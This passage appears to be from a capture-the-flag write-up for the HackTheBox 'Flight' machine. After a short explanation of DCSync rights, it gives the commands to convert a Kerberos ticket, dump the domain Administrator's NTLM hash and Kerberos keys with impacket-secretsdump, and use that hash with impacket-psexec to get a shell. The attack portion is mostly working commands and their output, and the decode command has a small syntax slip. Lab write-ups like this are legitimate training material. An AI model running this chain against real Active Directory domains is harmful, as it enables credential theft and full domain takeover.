
DCSync rights are particularly powerful in Active Directory environments. When you grant DCSync rights to a user, you’re essentially giving them the ability to impersonate a domain controller and request password data for any user in the domain. This is the same mechanism that domain controllers use to replicate password data between each other. With these rights, we can retrieve password hashes for any account — including administrator accounts — which is why it’s such a powerful privilege escalation technique. In a real environment, only domain controllers and a few other specifically designated accounts should have these rights.

Decode it.

```
cat ticket.kirbi.base64| base64 -d ticket.kirbi
```

Convert it to the format needed by my Linux System:

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

export it Kerberos Variable

```
export KRB5CCNAME=ticket.ccache 
```

Trying to Dump Domain Hashes out of memory.

```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
```

Clock skew error??

```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```

Connected to target system.

```
impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

```

